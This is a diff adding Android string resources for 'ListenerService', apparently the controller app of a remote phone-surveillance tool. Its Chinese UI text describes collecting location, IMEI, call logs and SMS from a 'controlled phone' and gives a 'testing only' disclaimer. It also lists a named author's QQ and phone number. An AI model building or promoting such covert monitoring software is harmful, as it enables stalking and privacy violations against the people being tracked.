@@ -1,0 +1,33 @@
+<resources>
+    <string name="app_name">ListenerService</string>
+    <string name="system_start">系统启动中…</string>
+    <string name="disclaimer">免责声明</string>
+    <string name="agreement">
+        软件仅供测试交流\n
+        请勿用于商业用途\n
+        如有法律责任纠纷\n
+        一律与开发者无关\n
+        点击同意则表示阁下已清楚上述声明。</string>
+    <string name="login">登录</string>
+    <string name="username">账号</string>
+    <string name="loginHint">请输入账号</string>
+    <string name="password">密码</string>
+    <string name="passwordHint">请输入密码</string>
+    <string name="host">主机</string>
+    <string name="me">我的</string>
+    <string name="load_fail_text">加载失败…</string>
+    <string name="not_data">您还没有添加主机\n请在被控手机上安装被控端并注入信息</string>
+    <string name="me_user">我的账号</string>
+    <string name="about">关于</string>
+    <string name="exit_login">退出登录</string>
+    <string name="change_password">修改密码</string>
+    <string name="service_phone">客服电话</string>
+    <string name="introduce">此项目是一款安卓手机集远程获取定位城市、详细地址、经纬度，手机型号、
+        IMEI号、通话记录、短信记录、网络状态等一体化远程获取资料的软件。此项目仅供技术测试交流，
+    请勿用于商业用途，如产生法律责任纠纷，一律与开发者无关。</string>
+    <string name="weipeilong">作\t者：<u>魏培龙</u></string>
+    <string name="qq">Q\t Q：<u>917351143</u></string>
+    <string name="call">电\t话：<u>18244267955</u></string>
+    <string name="host_info">主机信息</string>
+    <string name="not_FeedbackData">被控端无数据上传</string>
+</resources>
